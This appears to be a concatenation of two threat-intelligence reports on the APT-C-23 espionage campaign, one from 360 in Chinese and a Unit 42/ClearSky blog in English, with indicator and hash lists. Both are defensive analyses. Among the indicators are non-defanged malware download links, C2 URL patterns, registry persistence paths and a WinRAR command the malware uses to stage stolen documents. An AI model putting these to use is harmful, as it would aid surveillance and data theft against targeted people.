endpointup[.]com
siteanalysto[.]com
goodydaddy[.]com
10f27d243adb082ce0f842c7a4a3784b01f7248e
b8237782486a26d5397b75eeea7354a777bff63a
09c3af7b0a6957d5c7c80f67ab3b9cd8bef88813
9b923303f580c999f0fdc25cad600dd3550fe4e0
0b58c883efe44ff010f1703db00c9ff4645b59df
0a5dc47b06de545d8236d70efee801ca573115e7
782a0e5208c3d9e8942b928857a24183655e7470
5f71a8a50964dae688404ce8b3fbd83d6e36e5cd
03b404c8f4ead4aa3970b26eeeb268c594b1bb47
Certificates – SHA1 fingerprints
10:EB:7D:03:2A:B9:15:32:8F:BF:68:37:C6:07:45:FB:DF:F1:87:A6
9E:52:71:F3:D2:1D:C3:22:28:CB:50:C7:33:05:E3:DE:01:EB:CB:03
44:52:E6:4C:97:4B:6D:6A:7C:40:AD:1E:E0:17:08:33:87:AA:09:09
67:43:9B:EE:39:81:F3:5E:10:33:C9:7A:D9:4F:3A:73:3B:B0:CF:0A攻击平台主要包括Windows与Android，攻击范围主要为中东地区，截至目前我们一共捕获了Android样本24个，Windows样本19个，涉及的C&C域名29个。
后门程序主要伪装成文档、播放器、聊天软件以及一些特定领域常用软件，通过鱼叉或水坑等攻击方式配合社会工程学手段进行渗透，向特定目标人群进行攻击。
相关恶意可执行程序多为“.exe”和“.scr”扩展名，但是这些程序都伪装成doc、xls文档图标，并且文件中还包含一些用以迷惑用户的文档。
攻击者在诱饵文档命名时也颇为讲究，如“الاجهزة الامنية”（安全服务）、“Egyptian Belly Dancer Dina Scandal, Free Porn”（肚皮舞者Dina丑闻，色情），此类文件名容易诱惑用户点击。
Android端后门程序功能主要包括定位、短信拦截、电话录音等，并且还会收集文档、图片、联系人、短信等情报信息；PC端后门程序功能包括收集用户信息上传到指定服务器、远程下载文件以及远控。
通过相关信息的分析，发现该组织极有可能来自中东。
关键词：双尾蝎、APT-C-23、巴勒斯坦、教育、军事、鱼叉、水坑、伪装
第一章概述
2016年5月起至今，双尾蝎组织（APT-C-23）对巴勒斯坦教育机构、军事机构等重要领域展开了有组织、有计划、有针对性的长时间不间断攻击。攻击平台包括Windows与Android，攻击范围主要为中东地区，截至目前我们一共捕获了Android样本24个，Windows样本19个，涉及的C&C域名29个。
2016年5月，我们捕获了第一个Android平台下的相关特种木马，在此后的半年中，我们又先后捕获了与该组织相关的不同形态的特种木马程序样本数十个。并且在2016年7月开始捕获到Windows系统的相关木马程序。该木马主要伪装成文档、播放器、聊天软件以及一些特定领域常用软件，通过鱼叉或水坑等攻击方式配合社会工程学手段进行渗透，向特定目标人群进行攻击。入侵成功后攻击者开始窃取目标系统中的各类文档资料并且进行实时监控。
360威胁情报中心将APT-C-23组织命名为双尾蝎，主要是考虑了以下几方面的因素：一是该组织同时攻击了巴勒斯坦和以色列这两个存在一定敌对关系的国家，这种情况在以往并不多见；二是该组织同时在Windows和Android两种平台上发动攻击。虽然以往我们截获的APT组织中也有一些进行多平台攻击的例子，如海莲花，但绝大多数APT组织攻击的重心仍然是 Windows平台。而同时注重两种平台，并且在Android平台上攻击如此活跃的APT组织，在以往并不多见。第三个原因就是蝎子在巴以地区是一种比较有代表性的动物。综上，根据360威胁情报中心对APT组织的命名规则（参见《2016年中国高级持续性威胁研究报告》），我们命名APT-C-23组织为“双尾蝎”。
第二章 受影响情况
本章主要对相关攻击行动所针对目标涉及的地域和行业进行相关统计分析，时间范围选择 2016年5月1日到至今。
一、地域分布
双尾蝎行动主要针对目标为巴勒斯坦，占比高达84.8%，其次是以色列，占8.1%，分布如图1所示。
图1 受影响地域分布
二、领域分布
从行业分布上看，教育机构是双尾蝎行动重点针对目标，其次是军事机构，具体分布如图2所示。
图2 受影响行业分布
第三章载荷投递
一、攻击方式
（1）水坑攻击
Android端间谍软件主要伪装成Facebook升级模块、聊天软件以及Tawjihi 2016（Tawjihi是约旦和巴勒斯坦的一种类似于高考的考试），通过挂载在具有迷惑性的下载网址上引诱目标下载安装。
攻击者注册了一系列类似于gooogel.org、acount-manager.info、apppure.info这种具有迷惑性的网址，并且上面都挂着许多正常样本用于干扰、迷惑，从而导致用户中招。表1是某恶意程序具体下载链接和链接对应的 RAR 文件 MD5。
恶意下载链接
http://drive.acount-manager.net/F5YVWRDBbnsghWe6lN4DSRedB2FsVUQ/download\_\_\_\_\_\_\_\_\_\_.zip
表1 恶意程序下载链接和链接对应的RAR** 文件MD5**
zip压缩包中exe文件使用.scr后缀，该格式为exe的衍生类型，并且通过修改 exe 图标为文档来诱导用户点击。
进一步分析，还发现了部分恶意程序下载链接。
http://acount-manager.info/F5YVWRDBbnsghWe6lN4DSRedB2FsVU1Q/download__________.zip
http://drive.acount-manager.net/F5YVWRDBbnsghWe6lN4DSRedB2FsVUQ/downloadfile____________.zip
（2）疑似鱼叉邮件
相关恶意可执行程序多为“.exe”和“.scr”扩展名，但是这些文件都伪装成doc、xls文档图标，并且文件中还包含一些用以迷惑用户的文档，从以往此类事件的分析经验来看，一般这类可执行程序均进行压缩，以压缩包形态发送。压缩包和包内恶意代码文件名一般是针对目标进行精心构造的文件名，相关文件名一般与邮件主题、正文内容和恶意代码释放出的诱饵文档内容相符，因此这次攻击行动极有可能会以鱼叉邮件的方式进行投递。
二、 诱饵文件
双尾蝎行动中主要使用两种文件形式。
一种是通过 winrar 的自解压功能将相关样本文件和诱饵文件打包为 exe文件，运行该exe文件，会释放出恶意样本并打开诱饵文件进行伪装。其中exe母体文件主要通过图标进行伪装，涉及的图标包括安装补丁、视频、文档等，并且文件名一般是针对目标进行精心构造的文件名，与释放出的诱饵文档内容相符，通过样本属性中的注释，可以看到内嵌SFX script commands。
另一种是使用scr后缀名的文件，该文件格式是Windows系统中屏幕保护程序，为exe的衍生类型，通过在资源段存放诱饵文档，运行该类型的恶意文件后，会首先打开诱饵文件进行伪装。
（1）文档类
据网上公开消息得知，巴勒斯坦高考是6月份开始，持续20天，而这一时期我们捕获的样本中就有伪装成“Tawjihi 2016”（高考 2016）的Android应用程序，同时期从Windows平台捕获的样本使用的诱饵文档是巴勒斯坦2015年高考成绩，如图3所示。
图3 诱饵文档1
从攻击时间和伪装内容的选取上，可以看出攻击者目标很明确具有很强的针对性。教育一直是各个国家非常重视的领域，特别是巴勒斯坦从2007年内部分裂以后，直到2014年才进行了7年来第一次全国统一高考。对于巴勒斯坦人来说，高考更显得重要，攻击者选取这个领域也是别有用心。
除此之外还有包含军事类新闻信息的伪装文档，例如，图4内容是加沙地区某军事事件的采访新闻，图5是关于加沙地区军事领导人的任命消息：
图4 诱饵文档2
图5 诱饵文档3
（2）软件类
用于攻击的后门程序都是经过伪装的，Android端主要是伪装成Facebook升级程序和其他一些常用软件，Windows端主要伪装成播放器、文档等常用图标。
图6 欺骗性软件图标1
图7 欺骗性软件图标2
（3）视频类
图10 部分文件名
从上图文件名可以看出，攻击者在诱饵文档命名时也颇为讲究，如“الاجهزة الامنية”（安全服务）、“Egyptian Belly Dancer Dina Scandal, Free Porn”（肚皮舞者Dina丑闻，色情），此类文件名容易诱惑用户点击。
第四章 后门分析
一、Android
Android平台相关后门程序可以在拨打电话或是收到来电时，开启录音功能：
图11 监听电话
并且通过拦截短信，可以根据短信内容开启录音或是上传录音文件功能：
图12 根据短信内容开启录音功能
除了定位、短信拦截、电话录音等监控功能，后门程序还要负责收集文档、窃取联系人、上传短信内容等情报信息收集，相关类名和功能如下表：
图14 截获的上传图片文件数据包
移动端后门早期版本使用C&C域名比较单一（upload202.com），从2016年7月份开始捕获的后门程序中开始出现新的C&C地址（mediauploader.info），但是代码和功能上与早期版本基本相似。大约从9月份开始，虽然代码未混淆部分命名规则没变，但是程序下载地址和上传服务器地址发生了改变，代码也做了一些改进。从2017年1月份开始，捕获的样本未混淆部分类名采用之前类名的缩写，并且使用全新的C&C地址，短信指令增加到8个。
图15 Android 样本版本演进图
Android端后门程序从早期版本中就有拦截短信获取指令的功能，随着版本的更新，指令个数也越来越多。
表3 短信命令与对应功能
早期版本样本大都伪装成聊天软件和高考软件，而且奇怪的是，许多样本出现在6月份，但是其释放的后门程序早在5月初就已经出现。在前面“诱饵文档”一节中我们已经分析这批样本极有可能是针对教育行业，虽然攻击时间是在正值巴勒斯坦高考的6月份，但是样本却在5月份甚至可能更早就已经完成编写，这也说明这次攻击早有预谋。
二、Windows
PC端后门大致可以分为两个版本，早期版本采用Delphi编写，使用C&C域名主要为（upload101.net 、upload999.net），从2016年10月份开始捕获到新的后门程序，此类程序采用MFC编写，并使用了新的C&C地址（ www.mailsinfo.net），
但是代码和功能上与早期版本基本相似，都是上传计算机信息到服务器，并远程下载文件执行。
图16 PC样本版本演进图
（一）Delphi版本
主要功能：一是收集用户信息（如电脑名、用户名等），上传到指定服务器，进一步还会从服务器上下载文件（下载的文件暂时还未找到）并运行；二是远控功能（如截屏、结束进程），其隐藏界面如下：
图17 被隐藏的界面
（1）判断系统版本在对应的%appdata%目录下创建WindowsShell子目录，将自身复制到该目录下，并在注册表（HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run）中添加自启动。
https://upload999.net/win\_downloader/windows/ <计算机名> _<用户名>/screenShot
远控服务端为 https://upload999.net/win_downloader/windows/< 计算机名> _<用户名>/ + 命令，通过服务器返回值来判断是否操作。
（2）将获取的硬盘类型、序列号信息存在自启动目录（HKCU\Software\Microsoft\Windows\CurrentVersion\Run）下的子键hdflag中，并且该信息会被发送至服务端，若发送成功，则在自启动目录下新建senid项，并设置为true，表明已发送硬盘信息。
（4）访问mailsinfo.net/info/checkmails.php，获取新的URL，另外通过访问 www.mailsinfo.net/info/checkmailp.php获取新URL 参数，最后访问组合的地址下载文件（已失效）。
（5）下载的文件根据系统版本存放不同的目录，如xp系统，存放在C:\Documents and Settings\All Users\Favorites\VLC目录下，并设置自启动，最后通过ShellExecuteW将其运行。
whois 隐私保护是指域名注册服务商为域名注册者提供的一种服务，即域名whois信息会隐藏域名注册者的真实信息，如电子邮件地址、电话号码等，一般这种服务为收费有偿服务。在APT攻击中，相关组织非常喜欢采用whois隐私保护这种方式来隐藏自己的真实身份，安全研究机构或人员很难找到相关线索信息进行关联回溯。下图为该组织行动中C&C域名的保护情况。从图26中可以看到该组织使用的C&C大部分都有whois保护，占据了60.7%，也说明了该组织对自己的真实身份有较强的保护意识。
图26 C&C 域名保护情况
二、 C&C服务器地域分布
图27 C&C 服务器地域分布
从图27可以看出该组织攻击行动中所使用的IP地理位置主要集中在美国和立陶宛，这两个地域占比超过了85%。需要注意的是C&C（ www.mailsinfo.net）地理位置为巴勒斯坦地区，通过Whois查询该C&C为公司注册，其注册人为Nepras company，与以前样本出现的C&C存在不同，这里猜测该域名当时被攻击者劫持。
三、 C&C、IP及部分样本对应关系
图28 C&C、 IP及部分样本对应关系
通过图28中的C&C、IP及部分样本对应关系，很明确说明了PC端样本（5bbb5604bc0f656545dfcbb09820d61a）与Android平台样本（acc903afe22dcf0eb5f046dcd8db41c1）样本存在强关联，这些样本使用的域名都是upload101.net。
另外，通过对上图中出现的域名（upload202.com、mediauploader.info、upload101.net、upload999.com、upload999.net、upload999.info、upload999.org、akashipro.com、acount-manager.info、acount-manager.net、mary-crawley.com、cecilia-gilbert.com）进行 WHOIS 信息分析， 发现相关域名持有者邮箱都是adam.swift.2016@gmail.com ，这也明确说明了是同一组织进行的攻击。
第六章 关联分析
图30 Android样本代码截图（C&C地址）
从PC、Android样本中使用的C&C，以及都是采用 http://upload101.net/平台/domains 的形式，可以看出该组织为同一伙人。
攻击行动中PC与Android平台，都使用了“Tawjihi”字符串
78b65852b20fbf2a6b2319a1746b6d80
C:\Users\USA\Documents\Visual Studio 2008\Projects\New folder (2)\kasper\Release\kasper.pdb
775c128456a53dec85305a1e78ed5edf
C:\Users\Yousef\Desktop\MergeFiles\Loader v0\Loader\obj\Release\Loader.pdb
表10 PC样本PDB路径
上表是PC平台中PE文件的PDB路径，这个路径就是恶意代码作者本机的文件路径，从相关用户名“USA”、“Yousef”来看，这些用户名更多出现在阿拉伯中东地区。
通过对双尾蝎相关TTPs（Tools、Techniques、Procedures）的研究分析，以及结合以往跟进或披露的 APT 组织或攻击行动，总结出以下几点：
（1）移动端APT事件逐渐增多
以往披露的APT事件主要是针对Windows系统进行攻击，现今由于Android系统、APP的普及与发展，带动了Android手机等智能终端用户量的持续攀升，从而导致黑客组织的攻击目标也逐渐转向移动端。我们在捕获样本时率先捕获到Android样本，并且Android样本后期更新速率很快，从而也变向说明该组织主要是基于Android系统进行攻击。
因此，针对移动端的APT攻击不容忽略。
（2）攻击技术由浅入深。
技术分析显示，该组织初期使用的特种木马技术并不复杂，但后期版本中，此类木马开始采用文件伪装、字符串加密、并使用云控技术来逃避杀软的查杀。综合来看，该组织的攻击周期较长攻击目标之明确、 社工手段之精准，并且攻击过程中使用了大量资源，都表明这不是一个人或一般组织能承受的攻击成本。
因此双尾蝎行动背后组织应该不是普通的民间黑客组织，很有可能是具有高度组织化的、专业化的黑客组织。
（3）攻击组织极可能来自中东。
前面分析知道PDB路径有“USA”、“Yousef”等字符串，Android后门程序证书为“Jamal Hassan”、“Yousef Aburabee”等字符串。并且 C&C的注册人邮箱为adam.swift.2016@gmail.com ，这些名字（“USA”、“Yousef”、“adam”）常常出现在阿拉伯地区。C&C注册人公开信息显示来自于加沙，另外，恶意代码时间戳大部分为北京时间下午到凌晨2点， 对应至中东地区时间也大致在工作时间内。
因此，双尾蝎攻击行动极可能来自中东。
附录A：样本MD5This blog is the result of joint research between Unit 42 and Eyal Sela ClearSky Cyber Security .
Over the past few months Palo Alto Networks have been working together with ClearSky on preventing and detecting targeted attacks in the Middle East using two relatively new Microsoft Windows malware families which we call KASPERAGENT and MICROPSIA. In addition, our research has uncovered evidence of links between attacks using these two new malware families and two families of Google Android malware we are calling SECUREUPDATE and VAMP.
We named the first new Microsoft Windows malware family “KASPERAGENT” based on strings we found in the malware. (Note that we DO NOT believe this is a reference to Kaspersky Lab). We named the second new Microsoft Windows malware family MICROPSIA because the malware is very tightly packed making it appear smaller than it is, similar to the human condition micropsia . We named the first new Google Android malware family SECUREUPDATE because it masks its malicious updates a secure updates. We named the second new Google Android malware family VAMP because it’s focused on stealing data.
The attacks are not highly sophisticated, but the themes used, organizations and geographies targeted, as well the persistence of the attacker suggest a determined and noteworthy adversary. Some of this activity has been covered in a recent post by 360 security , however there is still a great deal of extra detail we are able to add in this report.
Starting in March 2016, Palo Alto Networks began monitoring this threat following the successful prevention of the execution of a sample of the KASPERAGENT malware on a customer system, however the malware had likely already been used in attacks as early as July, 2015.
At the time of writing, we have uncovered:
113 samples of the KASPERAGENT malware
94 samples of the MICROPSIA malware
17 samples of Android Malware which are related to this activity.
39 command and control domains registered in relation to this activity
Most of the attacks discovered so far target users in the United States, Israel, Palestinian Territories, and Egypt; although there are occasional outliers. Notable outliers include media organizations in a variety of countries.
This post will begin by exploring how the attackers attempt to gain a foothold into target networks before briefly describing the malware families used.
One Bit.ly at a time
This group of attackers favors using URL shortening services to disguise the true links they are sending in spear phishing emails. In particular, a number of samples we analyzed were linked via the URL shortening service "bit.ly". The URL shortening service then redirects users to the malicious payload hosted on attacker controlled pages, with the malicious payload nearly always contained in an archive file (most commonly a RAR file.) Using the statistics provided by these link-shortening services, we can gain an immediate insight into the targets clicking these links:
Figure 1: The bit.ly statistics for a link to a dropper for the MICROPSIA malware family.
The statistics vary per link, suggesting different target audiences for different waves of spear phishing. For example, the statistics shown in Figure 1 the campaign targeted 113 users in Egypt, whereas in another example shown in Figure 2 , Egypt did not make the top 3 countries targeted:
Figure 2: The bit.ly statistics for another link to a copy of the MICROPSIA malware family
FAKE NEWS!
Sending spear phishing emails with direct links to malicious shortened URLs was not the only method employed by the attackers to entice users to install the malware, another method favored by the attackers was the setting up of fake news sites. Figure 3 shows examples of pages created by the attackers to this end.
Figure 3: Two fake new sites with links to shortened malicious URLs.
We are unable to confirm how traffic was driven to these sites, the attackers may have helped drive traffic via fake social media accounts, or they may have sent spear phishing links to these pages.
Malware Analysis: MICROPSIA, KASPERAGENT and the missing link
During our analysis, we discovered two distinct malware families which for the most part leveraged distinct infrastructure with no overlaps, initially leading us to categorize these campaigns separately. Later, we discovered a key link between the two sets of activity which leads us to believe they are related.
The MICROPSIA activity centers around domains registered using the email address adam.swift.2016@gmail[.]com – and no samples of KASPERAGENT talk to these domains. However, one of the domains (drive.acount-manager[.]net) registered by this address was used to host a sample (babf156ede8b5c2e6c961b6ffcccc5eb7a3d283b398370754061613f439d40f9) of KASPERAGENT, causing us to link the two sets of activity.
KASPERAGENT
We have named the most common malware involved in this campaign, KASPERAGENT, due to PDB strings left behind in many samples of the malware. An example of a PDB string left behind is given below:
c:\Users\USA\Documents\Visual Studio 2008\Projects\New folder (2)\kasper\Release\kasper.pdb
c : \ Users \ USA \ Documents \ Visual Studio 2008 \ Projects \ New folder ( 2 ) \ kasper \ Release \ kasper . pdb
This analysis is based on the following file:
SHA256: babd654ef363e0645ce374dd9e2a42afe339c52f1cf17fc2285d8bebd3cfa11e
The file is compressed using the legitimate tool "mpress.exe" and once executed drops the payload to the directory C:\vault\igfxtray.exe which has the SHA256 hash f26caee34184b6a53ecbc0b5ce1f52e17d39af2129561dd6361fb4d4364e2c8b.
The malware also drops a decoy document containing Arabic names and ID numbers to the same folder and displays it to the user.
KASPERAGENT is developed in Microsoft Visual C++ and attempts to disguise itself as a product that does not exist: "Adobe Cinema Video Player". The malware first establishes persistence using the classic method of adding a Run key, using the value "MediaSystem".
The malware connects to a C2 serverhosted on www.mailsinfo[.]net. The C2 server string in the binary is "obfuscated" in the most basic of senses, with the author adding '@' characters between letters and splitting the starting "www.m" to another string.
Figure 4: The Command and Control domain is obfuscated using a basic technique
Most of the samples of KASPERAGENT use "Chrome" as the user agent, but this recent sample uses "OPAERA", possibly a misspelling of “Opera”, the browser.
The malware communicates with the C2 server via HTTP requests and in the most recent samples observed the callbacks are made to PHP scripts whose names relate to towns or navigation. Example URLs used include:
GET request to /dad5/town.php
POST request to /dad5/addCity.php and /dad5/sign.php
Most examples of the malware are nearly identical, and the malware simply acts as a basic reconnaissance tool and downloader for further payloads, however some examples of the malware include extended capabilities beyond that of a simple downloader. Examples of the extended-capability KASPERAGENT samples include:
a52d3e65fe5bbf57bab79b1c5092b66d9650247249b72f667a927f266d09efe6
c9ffb81a97a9458f1fc96f35cd187b1d7311479e77d031586abdc3d426da0859
7f11e0bbc892a97b7c42416c43fe178ebb240939d9dee70c3c598305ce8a2d4f
These extended-capability samples connect to www.stikerscloud[.]com and implement the following additional functionality:
Theft of passwords for Firefox and Chrome browsers
Take screenshots
Recording user keystrokes
Exfiltrate basic environment information such as the username and computer name
Perform arbitrary commands
Enumerate removable drives and copy files of interest to a new folder for exfiltration
Update the malware to a new version
Exfilitrate arbitrary files (zip compressed and encrypted)
It's also worth mentioning that sometimes that both versions of the malware are wrapped in a Microsoft .NET Framework loader which is responsible for deploying the malware and displaying the decoy document. The author (imaginatively) calls this wrapper 'Loader' an example of this is the file is 4c1973278a30d1b4ce206eca63676624d234260758a0674d191d338a02914d23, which contains the PDB string: C:\Users\Yousef\Desktop\MergeFiles\Loader v0\Loader\obj\Release\Loader.pdb
MICROPSIA Analysis
The MICROPSIA malware family is written in Delphi and is an information stealing malware family with a wide range of data theft functionality built in. This analysis is based on the following sample:
SHA256: 6e461a8430f251db38e8911dbacd1e72bce47a89c28956115b702d13ae2b8e3b
We named the malware MICROPSIA because of the way it is often packaged. The malware is often delivered as a RAR, which once extracted contains an EXE, which is further packed using UPX. Once unpacked from UPX, the next level is a further SFX RAR file, which then contains the actual malware files within. This effectively means the initial payload is extremely compressed and appears much smaller than it really is. The final payload contains four legitimate executables as resources:
Two embedded DLLs relating to the OpenSSL library used for traffic encryption.
A copy of a command line version of WinRAR - used for encrypting and compressing the exfiltrated data
The file 'shortcut.exe' from optimumx.com (Creates, modifies or queries Windows shell links)
this is used for persistence by creating a link in the startup folder to the payload.
The malware begins execution by first copying itself to a predefined location, setting up persistence via an LNK file (hence the inclusion of the aforementioned shortcut.exe)
The main capabilities of the malware are as follows:
Logging of keystrokes to a hardcoded text file and exfiltration to a remote server
Capturing screenshots of the infected machines
Searching for files with extensions matching Microsoft Office documents and using WinRAR to archive these prior to exfiltration. Example syntax of the command used is as follows:
"Rar.exe a -r -ep1 -v2500k -hpd58ccc009be55ff172a9039bf35cf270 -ta2016-12-11 ProgramData\Recovery\bin\sys\sysTime\LMth_E E:\*.xls E:\*.doc"
"Rar.exe a -r -ep1 -v2500k -hpd58ccc009be55ff172a9039bf35cf270 -ta2016-12-11 ProgramData\Recovery\bin\sys\sysTime\LMth_E E:\*.xls E:\*.doc"
The value “d58ccc009be55ff172a9039bf35cf27” is used to encrypt exfiltrated documents and appears to be an MD5 hash, but we have not identified a string that maps to this hash.
A side of phishing
Interestingly in some cases the attackers combined an attempt to infect targeted users with malware, with an attempt to steal their credentials via traditional phishing techniques. The attackers sometimes directed users to sites spoofing legitimate services such as Google Drive to download the malware, however first the target users would be asked to fill in their credentials in, giving the attackers two chances to successfully steal target users’ data (via the phish and via the eventual malware infection):
Figure 5: In some cases, users were required to fill in their credentials to download the malware
And there's an APK twist...
Whilst a large number of the domains associated with the adam.swift.2016@gmail[.]com email address are associated with MICROPSIA samples, some have been observed hosting Android apps or acting as C2 domains for Android malware samples. Analysis of these apps shows these are also malicious, and the apps also contain some social engineering tricks to enable installation.
There are two main APK malware families used by the threat actor. The first is a malware family used to gain a foothold on to the device, it is effectively a downloader with no additional functionality and we call this malware SECUREUPDATE.
Figure 6: The applications often pretend to be social applications popular with end users.
In the sample we analyzed (6b4d65abf95cfb3cedd39b217ff0e4ee2229ae32aeda5170f34c5a3b9c5a0f3) the malware used the local calendar to sleep, creating an alarm in the future, at which point the malware would call back to receive an “Update”:
Figure 7: The alarm functionality in the SECUREPDATE malware was used to download and execute a further payload at a later date.
In a similar vein to the ‘a side of phishing’ section, some of the versions of SECUREUPDATE backdoor attempt to steal credentials for users, making them create accounts for these fake apps in addition to the installation of the malware. This technique relies on credential re-use across many accounts but will still yield some success for the attackers:
Figure 8: Some of the apps require users to “Login” giving the attacker the chance to record credentials of victims that may well be reused elsewhere.
The second malware family is a malware family we call VAMP, which is already described in great detail in the blog by 360, VAMP is fully featured with all the capabilities you’d expect from a malware family that resides on a phone. Features of the malware include:
Ability to record calls
Contact theft
Theft of documents stored on the device
Theft of messages
Another outlier in terms of domains registered by adam.swift.2016@gmail[.]com is the domain AppPure[.]info. From the outset, the site appears to be a legitimate page:
Figure 9: The app store created by the attackers which we believe was used to distribute malicious apps.
Although we have been unable to find malicious content hosted on this site, we believe that it is very likely that amongst the many legitimate apps available for download via this store some malicious apps may exist.
Concluding thoughts
Through this campaign there is little doubt that the attackers have been able to gain a great deal of information from their targets. We have been unable to uncover any evidence which allows us to confidently attribute this campaign to any known threat actor at present.
The scale of the campaign in terms of sheer numbers of samples and the maintenance of several differing malware families involved suggests a reasonably sized team and that the campaign is not being perpetrated by a lone wolf, but rather a small team attackers.
The campaign also illustrates that for some targets old tricks remain sufficient to run a successful espionage campaign, including use of URL shortening services, classic phishing techniques as well as using archive files to bypass some simple file checks.
Palo Alto Networks customers are defended from this threat in the following ways:
WildFire and Traps detect all of the malware discussed in this report as malicious.
The C2 domains listed in this report are blocked through Threat Prevention.
AutoFocus customers can monitor this activity by looking at the tags:
Appendix B – Associated Windows Malware Samples
KASPERAGENT
2c8a67f8118b6aef159dd280d5998b1c41edb406a1bc8e3960254a9642b6ae4b
a72178289bb518f9f100b78e56a9425332bf3a5220a6c5abd3d07c669a5d8b25
7fdf2bdc500a8703cceb76a427752ee70164b8283b4df42c5b13ed2124a88dbd
6926f430865bd08b621bd1c6581bfe77db3e9891b14f97d00563770186fc5e74
46b0f586a646e800ab63d1404a08864fb09aca73a13fd22542a9fce038643219
e9050c541859f2fabff6dcd492df02a48dd32d99b1f3e98ef7c14bbb6aa734a2
2709506acdb0c6aba5ce794ceada11b64078f5731b91359cb398bc967cb67eba
fcfe51fd23aadcab5a7878bd59b5354d3491d237b259e230ac51e49306b253c7
1bb2a7a6c271b7e607cf87f2a4003eae1653f304cde104fc0311611cbb96e431
b384ed2a4f484b70786e5ea84ff513d30fe4d068fd76cc214d448f7f1c4329fb
1bbd9498f50259917d737b70a875772f963424f69fb942b86d626283e154cab2
babd654ef363e0645ce374dd9e2a42afe339c52f1cf17fc2285d8bebd3cfa11e
f26caee34184b6a53ecbc0b5ce1f52e17d39af2129561dd6361fb4d4364e2c8b
325c5aa819dbd1596464ec018b9efb5938dbc59ac6a94c459932ef07412bca02
4b77194c47b5abb04b1395955ca25aa0bb63ce796247d22946bc07919c8e1b56
9ae853b1e678926358ac8c1cd583eb2d5968b99c2a16cf34334a22051bb630ec
1184916919ea9790adcd53b60c4bf875e54733e508344ffe6baf10b919a0fd1d
beb05e01b87e1a432b3ef37eb55db723a5a5231872a53ab777d7821358e97574
433d2c8a3e93191d09e11994438ec3413152baf64e26e8d9e43c2d2e056b700c
783486dd30ca43d3a6c6807530c023f61631e4b3e6f2e6c2830b5209ee384e13
2813409822b56ae81f08adcaed29a215b3bef0e4f1cc5a22c7169f9e16a188a0
6eca9aacc7d9ef570bf2521f5a1156825832282650d2d3734d964a834f97b3f4
b8285b66aa42f61de1c43423ea25f8cbe03ebb96d0917c153476e185a5909e57
6c51b3ca96d06cc695de3875f4d31962bb936331a82541ab610f269fec0b0a8c
cd051cb14f118e33a2299925a704a56d89ba92a310f2176a0942ec29babedee6
d5e145bf964b91210b79b25fc92ce19aacacadac14ebeb6f4111b6f4cabfd6c7
98553dacbb2fdd8d655907f29e8ba36265f931fd5c6fe83c4defafc10767d4f0
e1addb50f0fea302317c40017fcdad84e1b8bc0f6d5b3f2609de2a0576ad8f9a
a8825be2145fb5cc25194aa13f5168ac7ede1132632cdeebadfb640d063fc781
ae5625a0fe39b34884cfd33832181392e9cf5157b8070b2e1b3d04c87fb46eec
4eca7eedcb5cfa0f02306774b9ed685a5ffc738669bb90cb5d57dad87a46833b
400c9fa4012a67e88b986d206deb8b10acff3091b6e7c98f0f98ac553ebd021b
c7d2a0803f9d4f9f37d5a0f3a37b97eaa672d4b3c700163847736cb9f91aabad
71aa4f9bc78fd5d457e4a2f2914516fc0081d2d5d22da26e1c70f86d9bd6bab1
117f80111e0fb67f728091a1b96042ea6f1633ece8c8a519e45e38d408a6691e
4ae00d8000510629bbffc55652401ee4124109c55500075049f9440fe86391cb
df2f111c952ac720cb9e33afb24a1c9d0c9ecaeaea4c079f48fadc1a4ed333d5
2321fbde63ceb3d0086a9bbce55940cc6f05919acf49fdb731f75447863c795c
fa80f9b2163d7db3e026316967d241818c9e57c1376830899352115bc08d51ac
f296539deddb1b661868c69cde1783a2a2be15456ea3e31523652b5f10cc7d36
11cbd7a2ce58191e4dbd3efffba97c5c4c0edd437511e2ecbd42811dac1cfa3d
646b6591002c125108fa1e108aa9be84f4c83f3130836279745e372ee12867cf
4c1973278a30d1b4ce206eca63676624d234260758a0674d191d338a02914d23
e771f7512bd1efc86884fad12115f2fb5abc97eef78ca7dce1fbc9fb6f23360d
787f581acd27f8c8b449b3bc0ca214a1b3421197ff789333ef1b44a5de850c03
b119b2530baf4c80a5543b7c6bacb615357b2deff27d9b6a638f799617ec1641
00b9fe607cb0b6ba45cd7ffbc3d710264c6109fdbad992933f68bbfc15785a18
34a4a989a6d83eea916c455a9c304823786f11d39c7525583f75a0fd35906a1e
967fd8f1e08cde8dbc960f3d9fcac5a86b77003cae88d59be78ce0a7e6ad0d88
83d07d027709c724b146aaf44ff63d969b9c2824bb5f0b3c1be5af4f18b3cd97
42c12d9b35abbb79212bf9d35d7c391d18e2635e558eb6ab8472510df79da09f
f602d059bc6f7e1e5353b716fbbaf42fa5746e844532674198f59deec367490d
365be95490051c077b2bea93eb8e647cc4ab76cc51ebc6781abfca8b6d55b551
a52d3e65fe5bbf57bab79b1c5092b66d9650247249b72f667a927f266d09efe6
a8635544eab476c6128793b00bf1bd48ce9d41692585aab1690f2a44837efaac
4d54b94d081fa2d0c0626805f71bca86314201a6215fbd910c98024b372158c2
1a609b82e95501f56f0f47014c4224fdba457b27c58672292231c3adfcfdd7eb
babf156ede8b5c2e6c961b6ffcccc5eb7a3d283b398370754061613f439d40f9
e58267f9ff31408d0bb1b84948e1fd3c02231cfd0628797cc2a6045354e0b065
2dae0b95ba31c12c59d577b32c11ed3d1dff6db76f9c92064a2bc2764eb8611f
5e977ffbfc3d048c79640459ab33a932f1e17f77dae76d7a062c4cb0221b91f8
78536b8ba75ba8269950099bb8205a11e94db9c28558293971e981c3a9e57b24
f0cb1d8a58b389425f691522163a1cc3b2b6c4ca0004248c0f0daad7f4ffa12a
865bf72cd5f23350cba26bb185340ebc0def6b5bbd5d8c9c184e1d1e4d11c5b8
dff184a646f67fdf04fc7702e2a4ef60b4a165e56abb7e3a424f785ac8b02da9
3554b267dec35b5072ed5fce2510e70960e32195a0920811e83eb6207cc4bed0
baf0fe69b670a6b96489cfb0bd80b03d8b454d5a3d2407d3c1570f1db9b58927
e926cf1e40c46f9578c76bb0df3a3ba7667853b63cc58b0f064f529b4365fbe0
bacbcb52516bb1d54b82a8d128f460843827a9dff65024d4bedb88936fc40c97
618fc941c00005b02f62d9ebdb31363e4d51b2f927f3d0b36c238a333f080ad0
64c5bfc0a1c76aaf9ed8b8f2a45d229afa9353a63fa7a2bba6d4a8c47980e70b
27b3a779d2e3d44cf0c4cc8e9f2862226fe329db7127b2272ba42011332832f3
2a71fcd81cf6c3bc6a43260b23cd7ef1c0694b0d85cdcdfdc8b25b139922a352
244621fad10485386493efec3818196fc50f1a66e3048a62de456d64a2331720
